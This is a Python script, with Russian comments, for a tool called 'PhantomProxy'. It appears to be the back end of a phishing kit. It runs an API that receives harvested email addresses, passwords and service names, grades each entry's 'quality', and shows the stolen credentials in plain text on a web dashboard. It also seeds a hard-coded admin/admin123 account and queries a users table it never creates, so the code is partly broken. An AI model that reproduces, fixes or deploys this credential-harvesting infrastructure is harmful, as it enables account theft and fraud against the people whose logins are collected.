#!/usr/bin/env python3
"""
PhantomProxy v10.0 - Ultimate Edition
Простая и надёжная версия
"""

import os
import sys
import json
import sqlite3
import hashlib
import secrets
import threading
import time
from datetime import datetime
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler

# === КОНФИГУРАЦИЯ ===
VERSION = "10.0 ULTIMATE"
DB_PATH = Path(__file__).parent / 'phantom.db'
API_PORT = 8080
PANEL_PORT = 3000
DOMAIN = "verdebudget.ru"

# === БАЗА ДАННЫХ ===
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY,
        email TEXT, password TEXT, service TEXT, ip TEXT,
        quality_score INTEGER, classification TEXT, created_at TEXT
    )''')
    
    c.execute("SELECT * FROM users WHERE username='admin'")
    if not c.fetchone():
        admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
        c.execute("INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
                 ('admin', admin_hash, 'admin', datetime.now().isoformat()))
    
    conn.commit()
    conn.close()

# === AI SCORER ===
def calculate_quality(session):
    score = 0
    if session.get('email'): score += 40
    if session.get('password'): score += 60
    if score >= 80: return 'EXCELLENT', score
    elif score >= 60: return 'GOOD', score
    elif score >= 40: return 'AVERAGE', score
    else: return 'LOW', score

# === API SERVER ===
class APIServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self.send_json({'status': 'ok', 'version': VERSION})
        elif self.path == '/api/v1/stats':
            self.send_stats()
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/api/v1/credentials':
            self.save_credentials()
        else:
            self.send_error(404)
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_stats(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        conn.close()
        self.send_json({'total': total})
    
    def save_credentials(self):
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length).decode())
        
        quality_class, score = calculate_quality(data)
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO sessions (email, password, service, quality_score, classification, created_at)
                    VALUES (?, ?, ?, ?, ?, ?)''',
                 (data.get('email',''), data.get('password',''), data.get('service','Unknown'),
                  score, quality_class, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"🎯 New: {data.get('email','N/A')} ({quality_class})")
        self.send_json({'success': True})
    
    def log_message(self, format, *args): pass

# === PANEL SERVER ===
class PanelServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.show_dashboard()
        elif self.path == '/api/stats':
            self.api_stats()
        else:
            self.send_error(404)
    
    def show_dashboard(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 50')
        sessions = c.fetchall()
        conn.close()
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>PhantomProxy v{VERSION}</title>
    <meta charset="UTF-8">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea, #764ba2); color: #fff; min-height: 100vh; padding: 40px; }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        h1 {{ margin-bottom: 30px; font-size: 36px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 40px; }}
        .stat {{ background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; text-align: center; }}
        .stat-value {{ font-size: 56px; font-weight: bold; }}
        .stat-label {{ opacity: 0.8; margin-top: 10px; }}
        table {{ width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.1); border-radius: 15px; overflow: hidden; }}
        th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ background: rgba(255,255,255,0.2); }}
        .quality {{ padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; }}
        .excellent {{ background: #00b09b; }}
        .good {{ background: #00d2ff; }}
        .average {{ background: #f7971e; }}
        .low {{ background: #cb2d3e; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 PhantomProxy v{VERSION} - Ultimate Dashboard</h1>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-value">{total}</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat">
                <div class="stat-value">{len(sessions)}</div>
                <div class="stat-label">Recent</div>
            </div>
        </div>
        
        <h2 style="margin-bottom: 20px;">📋 Recent Sessions</h2>
        <table>
            <tr><th>ID</th><th>Email</th><th>Password</th><th>Service</th><th>Quality</th><th>Time</th></tr>
            {''.join(f"<tr><td>{s[0]}</td><td>{s[1]}</td><td>{s[2]}</td><td>{s[3]}</td><td><span class='quality {s[5].lower()}'>{s[5]}</span></td><td>{s[6]}</td></tr>" for s in sessions)}
        </table>
        
        <p style="margin-top: 30px; opacity: 0.6; text-align: center;">
            Auto-refresh: 30s | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        </p>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def api_stats(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        conn.close()
        self.send_json({'total': total})
    
    def log_message(self, format, *args): pass

# === MAIN ===
def start_api():
    server = HTTPServer(('0.0.0.0', API_PORT), APIServer)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    print(f"✅ API Server started on port {API_PORT}")

def start_panel():
    server = HTTPServer(('0.0.0.0', PANEL_PORT), PanelServer)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    print(f"✅ Panel Server started on port {PANEL_PORT}")

def show_menu():
    while True:
        print("\n" + "="*60)
        print(f"  🚀 PHANTOMPROXY v{VERSION}")
        print("="*60)
        print("\n  1. Start All Services")
        print("  2. Stop")
        print("  3. Status")
        print("  4. View Sessions")
        print("  5. Exit")
        print("\n  Links:")
        print(f"  Panel: http://localhost:{PANEL_PORT}")
        print(f"  API: http://localhost:{API_PORT}/health")
        print("="*60)
        
        choice = input("\n  Choice: ").strip()
        
        if choice == '1':
            start_api()
            start_panel()
            print("\n✅ All services started!")
        elif choice == '2':
            print("\n👋 Stopping...")
            sys.exit(0)
        elif choice == '3':
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM sessions')
            total = c.fetchone()[0]
            conn.close()
            print(f"\n📊 Status: {total} sessions")
        elif choice == '4':
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 10')
            sessions = c.fetchall()
            conn.close()
            print("\n📋 Last 10 sessions:")
            for s in sessions:
                print(f"  {s[1]} | {s[3]} | {s[5]}")
        elif choice == '5':
            print("\n👋 Goodbye!")
            sys.exit(0)

if __name__ == '__main__':
    print("\n" + "="*60)
    print(f"  🚀 PHANTOMPROXY v{VERSION}")
    print("="*60)
    print("\n  Initializing...")
    
    init_db()
    print("  ✅ Database ready")
    
    show_menu()
